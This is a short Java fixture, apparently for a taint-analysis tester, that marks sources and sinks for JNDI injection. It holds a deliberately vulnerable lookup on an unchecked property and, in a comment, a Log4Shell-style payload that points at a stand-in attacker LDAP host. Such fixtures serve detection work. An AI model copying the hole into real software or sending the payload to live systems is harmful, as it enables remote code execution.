/** Cross-language JNDI injection fixture — Java. */

public class JndiEndpoint {

    public void lookup() {
        String name = System.getProperty("jndi.name");  // $ source=jndi_injection
        try {
            javax.naming.InitialContext ctx = new javax.naming.InitialContext();
            Object obj = ctx.lookup(name);  // $ sink=jndi_injection
        } catch (Exception e) {}
    }

    public void log4jPattern() {
        String userAgent = System.getProperty("http.userAgent");  // $ source=jndi_injection
        // Pattern: ${jndi:ldap://attacker.com/a}  -- $ sink=jndi_injection
        org.apache.logging.log4j.Logger logger = null;
        logger.info("User-Agent: " + userAgent);
    }
}
